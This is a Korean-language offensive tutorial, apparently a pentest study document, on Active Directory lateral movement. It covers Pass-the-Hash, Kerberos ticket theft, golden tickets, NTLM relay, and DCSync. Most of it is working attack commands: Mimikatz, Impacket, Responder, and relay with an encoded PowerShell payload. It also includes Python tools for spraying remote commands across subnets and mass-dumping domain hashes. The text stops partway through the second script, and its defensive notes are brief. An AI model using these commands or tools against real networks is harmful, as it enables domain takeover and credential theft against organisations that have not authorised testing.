> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AD 횡이동 — NTLM 릴레이·DCSync·PsExec·원격 실행

## 0. 초보자를 위한 개념 이해

### AD 횡이동이란?

**횡이동(Lateral Movement)**은 네트워크 내부에서 처음 침투한 시스템에서 다른 시스템으로 이동하며 권한을 확장하는 기술입니다. Active Directory 환경에서는 도메인 컨트롤러 장악이 최종 목표입니다.

**왜 배우는가:**
```
공격 흐름:
  외부 → 직원 PC 장악 (초기 접근)
          ↓
          내부 네트워크에서 횡이동
          ↓
  도메인 컨트롤러 → AD 전체 장악

방어자 관점:
  - 어떤 경로로 이동하는지 파악 → EDR 탐지 규칙
  - 네트워크 분리로 이동 차단
  - 특권 계정 모니터링
```

### 핵심 횡이동 기법

```
NTLM 릴레이 (NTLM Relay):
  인증 요청을 가로채 → 다른 서버에 전달
  → 피해자의 자격증명으로 다른 시스템 접근
  도구: ntlmrelayx.py (Impacket)

Pass-the-Hash (PtH):
  NTLM 해시만으로 인증 (비밀번호 불필요)
  → mimikatz로 메모리에서 해시 추출
  → 다른 시스템에 재사용

PsExec 스타일 원격 실행:
  SMB를 통해 원격 명령 실행
  도구: psexec.py, smbexec.py (Impacket)

WMI 원격 실행:
  Windows Management Instrumentation
  → 원격 코드 실행, 백그라운드에서 조용히
```

### 필요한 도구
- **Impacket**: Python AD 공격 라이브러리 모음
- **CrackMapExec (CME)**: 자동화 네트워크 침투
- **mimikatz**: 자격증명 덤프 도구

### 기초 실습 예제
```bash
# 허가된 AD 침투 테스트 환경에서만!

# 네트워크 내 활성 세션 확인
crackmapexec smb 192.168.1.0/24 --sessions

# Pass-the-Hash로 원격 접근
crackmapexec smb 192.168.1.10 -u Administrator -H "NT해시" -x "whoami"

# NTLM 릴레이 준비 (Impacket)
python3 ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 학습 목표

이 문서를 마치면 다음을 이해하고 실습할 수 있습니다.

- 횡적 이동(Lateral Movement)이 무엇이고 왜 위험한지 설명할 수 있다
- Pass-the-Hash와 Pass-the-Ticket의 원리를 평이한 언어로 설명할 수 있다
- PsExec, WMI, WinRM, DCOM으로 원격 실행하는 방법을 이해한다
- NTLM 릴레이 공격의 단계별 흐름을 파악한다
- DCSync로 도메인 해시를 덤프하는 조건과 방법을 안다
- 블루팀 관점에서 횡이동을 탐지하는 핵심 이벤트 ID를 알고 활용할 수 있다
- Python CLI로 다중 호스트 원격 실행 및 자격증명 덤프를 자동화할 수 있다

---

## 횡적 이동(Lateral Movement)이란?

### 평이한 설명

횡적 이동은 공격자가 **"이미 침투한 시스템을 발판 삼아 같은 네트워크 내 다른 시스템으로 이동하는"** 기법입니다.

**실생활 비유: 회사 건물에서의 이동**

```
회사 건물(Active Directory 도메인):
  
  1층: 일반 직원 PC (낮은 권한)
  2층: 부서 서버 (중간 권한)
  3층: 관리자실 (높은 권한)
  지하: 금고 (도메인 컨트롤러)
  
  침입자 시나리오:
  ① 1층 일반 직원 PC 해킹 (초기 침투)
  ② 1층 직원의 ID 카드(자격증명)를 복사
  ③ 복사한 카드로 2층 서버실 입장 (횡이동)
  ④ 서버 관리자 계정 획득
  ⑤ 관리자 카드로 지하 금고 접근 (권한 상승)
  ⑥ 도메인 컨트롤러 장악 완료
```

횡적 이동이 특히 위험한 이유:
- 합법적인 관리 도구(WMI, WinRM)를 사용하므로 탐지가 어려움
- 네트워크 자격증명이 공유되는 AD 환경에서 빠르게 확산됨
- 한 번 시작되면 멈추기 어려움 — 전체 도메인이 위험

### 공격 킬 체인에서의 위치

```
[사이버 킬 체인 — 횡이동의 위치]

정찰 → 무기화 → 전달 → 익스플로잇 → 설치 → [C2] → [횡이동] → 목표 달성
                                                           ↑
                                                      이 문서의 범위
```

---

## Active Directory 기초 — 초보자를 위한 설명

### AD란?

Active Directory(AD)는 마이크로소프트의 **"회사 전체 직원과 컴퓨터를 중앙에서 관리하는 시스템"**입니다.

```
[AD 구조 비유: 회사 조직도]

도메인(corp.local) = 회사 전체
├── 도메인 컨트롤러(DC) = 인사부 + 보안팀 (모든 권한 관리)
├── OU(조직 단위) = 부서
│   ├── IT 부서
│   │   ├── 서버 1 (컴퓨터 계정)
│   │   └── 서버 2
│   └── 영업 부서
│       ├── PC-001
│       └── PC-002
└── 사용자 계정
    ├── administrator (도메인 관리자)
    ├── jsmith (일반 사용자)
    └── svc_backup (서비스 계정)
```

### 왜 AD가 공격 대상인가?

- **중앙화된 자격증명**: 한 계정이 수백 대 컴퓨터에 접근 가능
- **암묵적 신뢰**: 같은 도메인 내 컴퓨터는 서로 신뢰
- **레거시 프로토콜**: NTLM, Kerberos의 설계 취약점 존재
- **파급력**: DC 장악 = 전체 조직 장악

---

## 1. 횡이동 기법 개요

| 기법 | 도구 | 필요 권한 | 탐지 난이도 |
|------|------|-----------|-------------|
| PsExec | psexec.py / Sysinternals | 로컬 관리자 | 쉬움 (Event 7045) |
| WMI | wmiexec.py | 로컬 관리자 | 중간 |
| WinRM | evil-winrm | WinRM 접근 | 중간 |
| DCOM | dcomexec.py | 로컬 관리자 | 어려움 |
| Pass-the-Hash | pth-winexe | 로컬 관리자 해시 | 중간 |
| Pass-the-Ticket | Rubeus / ticketer.py | 유효한 티켓 | 어려움 |
| NTLM Relay | ntlmrelayx.py | 네트워크 위치 | 중간 |
| DCSync | secretsdump.py | DS-Replication 권한 | 중간~어려움 |

---

## 2. Pass-the-Hash (PtH) — 원리와 공격

### Pass-the-Hash란?

**간단한 설명**: 비밀번호를 몰라도 비밀번호의 "지문(해시)"만 있으면 로그인할 수 있는 기법입니다.

**비유: 열쇠 복사**

```
일반 인증:
  당신 → "비밀번호: P@ssw0rd123" → 서버 확인 → 접근 허용

NTLM 인증 (설계상 문제):
  당신 → NTLM 해시만 전송 → 서버 확인 → 접근 허용
  
  즉, 비밀번호 = abc123
      해시     = aad3b435b51404ee:e10adc3949ba59ab...(고정값)
  
  해시만 있으면 → 서버에 "해시를 보내서" 인증 통과!
  비밀번호 원문이 필요 없음!
```

**NTLM 해시를 어디서 얻나?**:
- LSASS 메모리 덤프 (Mimikatz)
- SAM 데이터베이스
- NTDS.dit (도메인 컨트롤러 데이터베이스)
- 메모리 스캐닝

### ASCII 공격 흐름

```
[Pass-the-Hash 공격 흐름]

단계 1: 해시 수집
  피해자 PC (192.168.1.50)
  └─ Mimikatz 실행
     └─ LSASS 메모리 → NTLM 해시 추출
        admin_hash = aad3b435b51404ee:e10adc3949ba59ab...

단계 2: 해시로 다른 시스템 인증
  공격자 도구 ──[NTLM 해시]──► 대상 서버 (192.168.1.10)
                               NTLM 인증 통과!
                               → 원격 명령 실행

단계 3: 확산
  192.168.1.10 ──► 192.168.1.20 ──► DC (192.168.1.1)
  (같은 해시로 다수 시스템 접근 — 관리자 해시 재사용)
```

### 실제 명령어

```bash
# ─────────────────────────────────────────────
# Impacket psexec — NTLM 해시로 원격 실행
# 방식: ADMIN$ 공유에 임시 서비스 생성 후 실행
# 특징: Event ID 7045 (서비스 설치) 생성 — 탐지 쉬움
# ─────────────────────────────────────────────
python3 psexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.100

# 예시 (실제 해시 형식)
python3 psexec.py -hashes :e10adc3949ba59abbe56e057f20f883e \
    corp.local/administrator@192.168.1.10

# ─────────────────────────────────────────────
# wmiexec — WMI 기반 (서비스 생성 없음, 조용함)
# 방식: WMI 쿼리로 프로세스 생성
# 탐지: 상대적으로 낮음
# ─────────────────────────────────────────────
python3 wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100
python3 wmiexec.py -hashes :e10adc3949ba59abbe56e057f20f883e \
    corp.local/admin@192.168.1.10 "whoami"

# ─────────────────────────────────────────────
# smbexec — SMB 기반, 탐지 더 어려움
# ─────────────────────────────────────────────
python3 smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# ─────────────────────────────────────────────
# evil-winrm — WinRM (PowerShell Remoting)
# 포트: 5985 (HTTP) / 5986 (HTTPS)
# ─────────────────────────────────────────────
evil-winrm -i 10.10.10.100 -u administrator -H NTLM_HASH
evil-winrm -i 192.168.1.10 -u administrator -H e10adc3949ba59abbe56e057f20f883e

# ─────────────────────────────────────────────
# xfreerdp — RDP PtH (Restricted Admin Mode 필요)
# ─────────────────────────────────────────────
xfreerdp /v:10.10.10.100 /u:administrator /pth:NTLM_HASH /d:domain

# ─────────────────────────────────────────────
# CrackMapExec / NetExec — 대량 PtH (서브넷 전체)
# 한 해시로 192.168.1.0/24 전체 스캔
# ─────────────────────────────────────────────
netexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH --local-auth
# 성공한 호스트: [+] 표시
netexec smb 192.168.1.0/24 -u admin -H :NTLM_HASH -x "whoami"
```

---

## 3. Pass-the-Ticket (PtT) — Kerberos 티켓 재사용

### Pass-the-Ticket란?

**간단한 설명**: Kerberos 인증 시스템의 "입장권(티켓)"을 훔쳐서 그 사람인 척 하는 기법입니다.

**비유: 콘서트 티켓 복사**

```
일반 Kerberos 인증:
  직원 → DC에 요청 → TGT 발급 (입장권) → 서비스 접근

Pass-the-Ticket:
  공격자 → 직원의 TGT 훔침 → 훔친 티켓으로 서비스 접근!
  
  TGT (Ticket Granting Ticket) = 콘서트장 마스터 티켓
  TGS (Ticket Granting Service) = 특정 구역 입장권
  
  TGT를 가지면 모든 구역(서비스) 티켓을 발급받을 수 있음!
```

### Kerberos 티켓 조작

```bash
# ─────────────────────────────────────────────
# Rubeus (Windows) — 티켓 덤프 및 주입
# ─────────────────────────────────────────────

# 현재 세션의 모든 티켓 덤프
Rubeus.exe dump /nowrap

# 특정 사용자 티켓 덤프
Rubeus.exe dump /user:administrator /nowrap

# 티켓 주입 (Pass-the-Ticket)
Rubeus.exe ptt /ticket:BASE64_ENCODED_TICKET

# 티켓 확인
klist

# ─────────────────────────────────────────────
# Mimikatz — 메모리에서 티켓 추출
# ─────────────────────────────────────────────
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

# ─────────────────────────────────────────────
# Impacket (Linux) — 티켓 생성 및 사용
# ─────────────────────────────────────────────

# NTLM 해시로 TGT 요청
python3 getTGT.py -hashes :NTLM_HASH domain.local/username

# ccache 파일로 환경변수 설정
export KRB5CCNAME=username.ccache

# Kerberos 인증으로 서비스 접근
python3 psexec.py -k -no-pass domain.local/username@target.domain.local
python3 secretsdump.py -k -no-pass domain.local/username@dc.domain.local

# ─────────────────────────────────────────────
# Golden Ticket — krbtgt 해시로 영구 접근
# (krbtgt = Kerberos 티켓 서명 마스터 키)
# ─────────────────────────────────────────────

# krbtgt 해시 획득 후 (DCSync 등으로)
# Impacket ticketer.py로 골든 티켓 생성
python3 ticketer.py -nthash KRBTGT_HASH \
    -domain-sid S-1-5-21-XXXXXXXX \
    -domain domain.local \
    administrator

# 골든 티켓 사용
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

---

## 4. WMI / WinRM / SMB 횡이동 — 상세 설명

### 각 방식 비교

```
[횡이동 방식 비교]

┌──────────┬──────────┬──────────────────┬──────────────┐
│  방식    │  포트    │  특징            │  탐지 난이도 │
├──────────┼──────────┼──────────────────┼──────────────┤
│ PsExec   │ 445(SMB) │ 서비스 생성      │ 쉬움         │
│ WMI      │ 135+동적 │ 서비스 없음      │ 중간         │
│ WinRM    │ 5985/5986│ PowerShell 원격  │ 중간         │
│ DCOM     │ 135+동적 │ COM 객체 악용    │ 어려움       │
│ SMB exec │ 445      │ 파일+실행        │ 중간         │
└──────────┴──────────┴──────────────────┴──────────────┘
```

### PsExec 동작 원리

```
[PsExec 내부 동작]

① 공격자 → ADMIN$ 공유에 실행 파일 업로드
② 공격자 → 서비스 제어 관리자(SCM)에 서비스 등록
③ 서비스 시작 → 명령 실행
④ 결과 반환 → 서비스 제거 + 파일 삭제

탐지 포인트:
  Event 7045: 새 서비스 설치
  Event 5145: ADMIN$ 공유 접근
  Event 4624: 네트워크 로그온 (Type 3)
```

```bash
# PsExec 사용법
# 비밀번호 사용
python3 psexec.py corp.local/administrator:Password@192.168.1.10

# 해시 사용
python3 psexec.py -hashes :NTLM_HASH corp.local/administrator@192.168.1.10

# 특정 명령 실행
python3 psexec.py corp.local/admin:Pass@192.168.1.10 "cmd.exe /c whoami"

# Sysinternals PsExec (Windows에서)
PsExec.exe \\192.168.1.10 -u administrator -p Password cmd.exe
PsExec.exe \\192.168.1.10 -hashes NTLM_HASH cmd.exe
```

### WMI 실행 원리

```
[WMI 내부 동작]

① 공격자 → DCOM/RPC(135)로 WMI 서비스 접속
② Win32_Process.Create() 메서드 호출
③ 대상 시스템에서 프로세스 생성 → 명령 실행
④ 결과를 WMI 쿼리로 수집

장점: 서비스 생성 없음 → Event 7045 미생성
탐지: Event 4688(프로세스 생성), WMI 활동 로그
```

```bash
# wmiexec 사용법
python3 wmiexec.py corp.local/admin:Password@192.168.1.10
python3 wmiexec.py -hashes :NTLM_HASH corp.local/admin@192.168.1.10

# 단일 명령 실행
python3 wmiexec.py corp.local/admin:Pass@192.168.1.10 "ipconfig /all"

# Windows PowerShell WMI (합법적 사용 예)
Invoke-WmiMethod -Class Win32_Process -Name Create \
    -ArgumentList "cmd.exe /c whoami" \
    -ComputerName 192.168.1.10 \
    -Credential (Get-Credential)
```

### WinRM (PowerShell Remoting)

```
[WinRM 동작]

① WinRM 서비스가 5985(HTTP) 또는 5986(HTTPS) 대기
② 인증: Kerberos / NTLM / 인증서
③ PowerShell 원격 세션 생성
④ 명령 실행 — SYSTEM이 아닌 사용자 권한으로 실행

특징: 가장 "합법적으로" 보이는 방식
탐지: Event 4624 Type 3, PowerShell 로그(4104)
```

```bash
# evil-winrm (공격 도구)
evil-winrm -i 192.168.1.10 -u administrator -p Password
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# 파일 업로드/다운로드
# evil-winrm 쉘 안에서:
upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Windows\System32\config\SAM /tmp/SAM

# PowerShell Remoting (Windows)
Enter-PSSession -ComputerName 192.168.1.10 -Credential corp.local\admin
Invoke-Command -ComputerName 192.168.1.10 -ScriptBlock { whoami }
```

---

## 5. NTLM 릴레이 공격 — 단계별 상세

### NTLM 릴레이란?

**간단한 설명**: NTLM 인증 시도를 가로채서 다른 서버에 "중계"하는 공격입니다.

**비유: 신분증 중계**

```
정상 인증:
  직원 → "저는 김철수입니다(NTLM 인증)" → 서버 A → 접근 허용

NTLM 릴레이:
  직원 → "저는 김철수입니다" → [공격자가 가로챔]
                                    ↓ 중계!
                               서버 B → "김철수로 로그인 성공!"

공격자는 김철수인 척 서버 B에 접근!
```

### 공격 전제 조건

```
NTLM 릴레이가 가능한 조건:
  ① 대상 서버의 SMB 서명(Signing)이 비활성화됨
     (서명이 있으면 릴레이된 인증을 검증할 수 없어 공격 실패)
  ② 공격자가 네트워크 중간에 위치(ARP 스푸핑 또는 LLMNR 포이즈닝)
  ③ 피해자가 공격자에게 NTLM 인증을 보내도록 유도됨
```

### ASCII 공격 흐름 다이어그램

```
[NTLM 릴레이 전체 흐름]

단계 1: 환경 준비
  ┌─────────────────────────────────────────────────┐
  │ SMB 서명 비활성화 호스트 탐색                    │
  │ netexec smb 10.10.10.0/24 --gen-relay-list ...  │
  └─────────────────────────────────────────────────┘

단계 2: 도구 배치
  공격자 시스템에서:
  ┌───────────────┐     ┌───────────────────────┐
  │   Responder   │     │    ntlmrelayx.py      │
  │ (LLMNR 포이즈) │     │ (인증 중계 + 명령실행)  │
  │ SMB/HTTP 끔   │     │ -tf relay_targets.txt │
  └───────────────┘     └───────────────────────┘

단계 3: 인증 캡처 및 중계
  
  피해자 PC ──[NTLM Auth]──► Responder
  (잘못된 이름 쿼리)          (포이즌 응답으로 인증 유도)
                                  │
                                  ▼ 중계!
                             대상 서버 (SMB 서명 없음)
                             ← 인증 성공 →
                             코드 실행!

단계 4: 결과
  대상 서버에서 명령 실행 완료
  또는 LDAP 권한 상승
  또는 Shadow Credentials 추가
```

### 실제 명령어 — 단계별

```bash
# ─────────────────────────────────────────────
# 단계 1: SMB 서명 비활성화 호스트 탐지
# ─────────────────────────────────────────────
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# SMB 서명 없는 호스트만 relay_targets.txt에 저장

# 수동 확인
netexec smb 10.10.10.0/24 | grep -v "signing:True"

# ─────────────────────────────────────────────
# 단계 2: Responder 설정 수정
# SMB/HTTP를 끄지 않으면 릴레이 대신 캡처만 함
# ─────────────────────────────────────────────
# /etc/responder/Responder.conf 수정
sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# ─────────────────────────────────────────────
# 단계 3: ntlmrelayx 실행 (코드 실행)
# ─────────────────────────────────────────────
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "powershell -enc BASE64_PAYLOAD" -l /tmp/loot

# SAM 덤프 (자격증명 수집)
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support

# LDAP 릴레이 → 권한 상승 (DCSync 권한 부여)
python3 ntlmrelayx.py -t ldap://DC_IP -smb2support \
  --escalate-user current_user

# LDAPS 릴레이 → Shadow Credentials (인증서 기반 인증 추가)
python3 ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials \
  --shadow-target target_computer$

# ─────────────────────────────────────────────
# 단계 4: Responder로 NTLM 인증 유발
# (ntlmrelayx와 동시에 실행)
# ─────────────────────────────────────────────
python3 Responder.py -I eth0 -wf

# ─────────────────────────────────────────────
# IPv6 기반 릴레이 (mitm6) — 더 강력한 변형
# Windows 기본 IPv6 활성화를 악용
# ─────────────────────────────────────────────
python3 mitm6.py -d domain.local
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker_wpad \
  --add-computer evilpc --delegate-access
```

---

## 6. DCSync 공격 — 상세 설명

### DCSync란?

**간단한 설명**: 도메인 컨트롤러(DC)인 척 위장하여 다른 DC에게 "패스워드 동기화 데이터를 주세요"라고 요청하는 공격입니다.

**비유: 가짜 인사부 직원**

```
정상 DC 복제:
  DC1 → DC2에게 "패스워드 DB 동기화 필요" → DC2 → 해시 전송 → DC1

DCSync 공격:
  공격자 → DC에게 "나도 DC야. 패스워드 DB 줘" → DC → 해시 전송 → 공격자!
  
  조건: 공격자 계정에 DS-Replication-Get-Changes-All 권한 필요
  (보통 Domain Admins 또는 Enterprise Admins 그룹)
```

### DCSync 권한 획득 경로

```
DCSync 권한 획득 방법:
  
  경로 1: Domain Admin 계정 탈취
  경로 2: Exchange 서버 취약점 (Exchange가 높은 AD 권한 보유)
  경로 3: WriteDACL 권한 악용 → DCSync 권한 직접 부여
  경로 4: AdminSDHolder 악용
  경로 5: NTLM 릴레이 → LDAP → DCSync 권한 부여
```

### 실제 명령어

```bash
# ─────────────────────────────────────────────
# Impacket secretsdump — DCSync
# ─────────────────────────────────────────────

# 전체 도메인 해시 덤프
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# 특정 계정만 덤프 (krbtgt — 골든 티켓 생성에 사용)
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP

# 도메인 관리자 해시 덤프
python3 secretsdump.py -just-dc-user administrator domain.local/admin:Password@DC_IP

# 모든 도메인 시크릿 덤프 및 저장
python3 secretsdump.py domain.local/admin:Password@DC_IP \
  -just-dc -outputfile dcsync_output
# 결과: dcsync_output.ntds (해시)

# ─────────────────────────────────────────────
# 해시로 DCSync (PtH)
# ─────────────────────────────────────────────
python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP -just-dc

# ─────────────────────────────────────────────
# Mimikatz DCSync (Windows)
# ─────────────────────────────────────────────
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# ─────────────────────────────────────────────
# ACL 기반 DCSync 권한 부여 (WriteDACL 권한 있을 때)
# PowerView 사용
# ─────────────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights DCSync

# 확인
Get-DomainObjectAcl "DC=domain,DC=local" | \
  Where-Object { $_.IdentityReference -match "attacker_user" }
```

---

## 7. 원격 실행 자동화 CLI

```python
#!/usr/bin/env python3
"""AD 횡이동 자동화 CLI — 다중 호스트 원격 실행.

Usage:
    python3 lateral_movement.py spray 10.10.10.0/24 corp.local -u admin -p Password -c "whoami"
    python3 lateral_movement.py spray targets.txt corp.local -u admin -H NTLM_HASH -c "whoami"
    python3 lateral_movement.py spray 192.168.1.10 corp.local -u admin -p Pass -c "whoami" --method wmi
"""

import argparse
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Literal
import ipaddress
import json


@dataclass
class ExecutionResult:
    target: str
    method: str
    success: bool
    output: str
    error: str = ""


def run_wmiexec(
    target: str,
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
) -> ExecutionResult:
    """WMI를 통한 원격 명령 실행."""
    if use_hash:
        auth = f"-hashes :{credential}"
        user_spec = f"{domain}/{username}@{target}"
        cmd = [
            "python3", "-m", "impacket.examples.wmiexec",
            "-hashes", f":{credential}",
            f"{domain}/{username}@{target}",
            command,
        ]
    else:
        cmd = [
            "python3", "-m", "impacket.examples.wmiexec",
            f"{domain}/{username}:{credential}@{target}",
            command,
        ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
        success = result.returncode == 0
        return ExecutionResult(
            target=target,
            method="wmiexec",
            success=success,
            output=result.stdout[:500],
            error=result.stderr[:200] if not success else "",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(
            target=target, method="wmiexec",
            success=False, output="", error="Timeout (30s)",
        )
    except Exception as e:
        return ExecutionResult(
            target=target, method="wmiexec",
            success=False, output="", error=str(e),
        )


def run_psexec(
    target: str,
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
) -> ExecutionResult:
    """PsExec를 통한 원격 명령 실행."""
    if use_hash:
        cmd = [
            "python3", "-m", "impacket.examples.psexec",
            "-hashes", f":{credential}",
            f"{domain}/{username}@{target}",
            command,
        ]
    else:
        cmd = [
            "python3", "-m", "impacket.examples.psexec",
            f"{domain}/{username}:{credential}@{target}",
            command,
        ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
        success = result.returncode == 0
        return ExecutionResult(
            target=target,
            method="psexec",
            success=success,
            output=result.stdout[:500],
            error=result.stderr[:200] if not success else "",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(
            target=target, method="psexec",
            success=False, output="", error="Timeout (30s)",
        )
    except Exception as e:
        return ExecutionResult(
            target=target, method="psexec",
            success=False, output="", error=str(e),
        )


ExecutionMethod = Literal["wmi", "psexec"]

METHOD_RUNNERS = {
    "wmi": run_wmiexec,
    "psexec": run_psexec,
}


def spray_targets(
    targets: list[str],
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
    max_workers: int = 10,
    method: ExecutionMethod = "wmi",
) -> list[ExecutionResult]:
    """다수 대상에 병렬로 명령 실행."""
    runner = METHOD_RUNNERS[method]
    results: list[ExecutionResult] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(runner, t, domain, username, credential, command, use_hash): t
            for t in targets
        }
        for future in as_completed(futures):
            target = futures[future]
            result = future.result()
            if result.success:
                print(f"[+] {target}: 성공")
                if result.output.strip():
                    print(f"    {result.output[:200].strip()}")
            else:
                print(f"[-] {target}: 실패 ({result.error[:80]})")
            results.append(result)

    return results


def expand_cidr(cidr: str) -> list[str]:
    """CIDR 표기를 IP 목록으로 변환."""
    network = ipaddress.ip_network(cidr, strict=False)
    return [str(ip) for ip in network.hosts()]


def parse_targets(target_input: str) -> list[str]:
    """대상 입력 파싱 — IP, CIDR, 파일 지원."""
    path = Path(target_input)
    if path.exists():
        return [line.strip() for line in path.read_text().splitlines() if line.strip()]
    if "/" in target_input:
        return expand_cidr(target_input)
    return [target_input]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="AD 횡이동 자동화 CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  # WMI로 서브넷 전체 명령 실행 (비밀번호)
  python3 lateral_movement.py spray 10.10.10.0/24 corp.local -u admin -p Password -c "whoami"

  # NTLM 해시로 실행
  python3 lateral_movement.py spray targets.txt corp.local -u admin -H NTLM_HASH -c "whoami"

  # PsExec 방식 사용
  python3 lateral_movement.py spray 192.168.1.10 corp.local \\
      -u admin -p Pass -c "net user" --method psexec

  # 결과 JSON 저장
  python3 lateral_movement.py spray 10.10.10.0/24 corp.local \\
      -u admin -H HASH -c "whoami" -o results.json
        """,
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    spray_p = sub.add_parser("spray", help="다수 호스트에 명령 실행")
    spray_p.add_argument("targets", help="대상 IP, CIDR 또는 파일 경로")
    spray_p.add_argument("domain", help="도메인 이름")
    spray_p.add_argument("-u", "--user", required=True, help="사용자명")
    spray_p.add_argument("-p", "--password", help="비밀번호")
    spray_p.add_argument("-H", "--hash", help="NTLM 해시")
    spray_p.add_argument("-c", "--command", required=True, help="실행할 명령")
    spray_p.add_argument(
        "--method",
        choices=["wmi", "psexec"],
        default="wmi",
        help="실행 방식 (기본: wmi)",
    )
    spray_p.add_argument("--workers", type=int, default=10, help="병렬 스레드 수")
    spray_p.add_argument("-o", "--output", type=Path, help="결과 JSON 저장 경로")

    args = parser.parse_args()

    if args.cmd == "spray":
        if not (args.password or args.hash):
            parser.error("비밀번호(-p) 또는 해시(-H) 중 하나가 필요합니다")

        targets = parse_targets(args.targets)
        credential = args.hash or args.password or ""
        use_hash = bool(args.hash)

        print(f"[*] {len(targets)}개 호스트에 '{args.command}' 실행 시작")
        print(f"[*] 방식: {args.method} | 스레드: {args.workers}")

        results = spray_targets(
            targets,
            args.domain,
            args.user,
            credential,
            args.command,
            use_hash,
            args.workers,
            args.method,
        )

        success_count = sum(1 for r in results if r.success)
        print(f"\n[*] 결과: 전체 {len(results)} / 성공 {success_count}")

        if args.output:
            args.output.write_text(
                json.dumps(
                    [vars(r) for r in results],
                    indent=2,
                    ensure_ascii=False,
                )
            )
            print(f"[*] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 8. 자격증명 덤프 자동화

```python
#!/usr/bin/env python3
"""다중 호스트 자격증명 덤프 자동화.

Usage:
    python3 cred_dump.py 192.168.1.10 corp.local -u admin -p Password
    python3 cred_dump.py targets.txt corp.local -u admin -H NTLM_HASH -o hashes.txt
"""

import argparse
import subprocess
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field


@dataclass
class CredentialDump:
    target: str
    ntlm_hashes: list[str] = field(default_factory=list)
    cleartext_passwords: list[str] = field(default_factory=list)
    error: str = ""


NTLM_PATTERN = re.compile(r"(\w[\w.$-]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::")
CLEARTEXT_PATTERN = re.compile(r"(\w[\w.$-]+):(\d+):(.+?):(.+?):::")


def dump_secrets(
    target: str,
    domain: str,
    username: str,
    credential: str,
    use_hash: bool = False,
) -> CredentialDump:
    """단일 대상에서 자격증명 덤프."""
    if use_hash:
        cmd = [
            "python3", "-m", "impacket.examples.secretsdump",
            "-hashes", f":{credential}",
            f"{domain}/{username}@{target}",
            "-just-dc",
        ]
    else:
        cmd = [
            "python3", "-m", "impacket.examples.secretsdump",
            f"{domain}/{username}:{credential}@{target}",
            "-just-dc-ntlm",
        ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
            check=False,
        )
        dump = CredentialDump(target=target)

        for line in result.stdout.splitlines():
            m = NTLM_PATTERN.match(line)
            if m:
                # 형식: username:rid:lm_hash:ntlm_hash
                entry = f"{m.group(1)}:{m.group(3)}:{m.group(4)}"
                dump.ntlm_hashes.append(entry)

        return dump

    except subprocess.TimeoutExpired:
        return CredentialDump(target=target, error="Timeout (60s)")
    except Exception as e:
        return CredentialDump(target=target, error=str(e))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="다중 호스트 자격증명 덤프 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 cred_dump.py 192.168.1.10 corp.local -u admin -p Password
  python3 cred_dump.py targets.txt corp.local -u admin -H NTLM_HASH -o all_hashes.txt
        """,
    )
    parser.add_argument("targets", help="대상 IP 또는 파일 경로")
    parser.add_argument("domain", help="도메인 이름")
    parser.add_argument("-u", "--user", required=True, help="사용자명")
    parser.add_argument("-p", "--password", help="비밀번호")
    parser.add_argument("-H", "--hash", help="NTLM 해시")
    parser.add_argument(
        "-o", "--output",
        type=Path,
        default=Path("/tmp/dumped_creds.txt"),
        help="해시 저장 파일 (기본: /tmp/dumped_creds.txt)",
    )
    parser.add_argument("--workers", type=int, default=5, help="병렬 스레드 수")

    args = parser.parse_args()

    if not (args.password or args.hash):
        parser.error("비밀번호(-p) 또는 해시(-H) 중 하나가 필요합니다")

    target_path = Path(args.targets)
    targets = (
        [line.strip() for line in target_path.read_text().splitlines() if line.strip()]
        if target_path.exists()
        else [args.targets]
    )

    credential = args.hash or args.password or ""
    use_hash = bool(args.hash)

    print(f"[*] {len(targets)}개 호스트에서 자격증명 덤프 시작")
    all_hashes: list[str] = []

    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(dump_secrets, t, args.domain, args.user, credential, use_hash): t
